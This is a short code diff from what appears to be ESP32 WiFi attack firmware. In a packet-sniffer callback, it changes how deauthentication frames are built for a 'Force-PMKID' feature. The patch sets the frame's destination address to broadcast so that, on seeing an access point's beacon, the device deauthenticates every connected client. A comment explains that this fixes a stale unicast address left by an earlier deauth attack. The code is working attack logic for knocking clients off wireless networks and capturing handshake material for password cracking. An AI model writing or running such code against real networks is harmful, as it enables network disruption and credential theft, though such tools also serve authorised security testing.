@@ -10951,9 +10951,15 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
   
   // Found beacon frame. Decide whether to deauth
   if (wifi_scan_obj.send_deauth) {
-    if (snifferPacket->payload[0] == 0x80) {    
+    if (snifferPacket->payload[0] == 0x80) {
       // Build packet
-      
+      // Destination (addr1) = broadcast so the deauth reaches every client of
+      // this AP. sendDeauthFrame() (a prior deauth attack) leaves a stale unicast
+      // MAC in bytes 4-9, which otherwise sent these to the wrong station and
+      // made Force-PMKID "not work" after any deauth had run.
+      for (int d = 4; d <= 9; d++)
+        wifi_scan_obj.deauth_frame_default[d] = 0xFF;
+
       wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
       wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
       wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
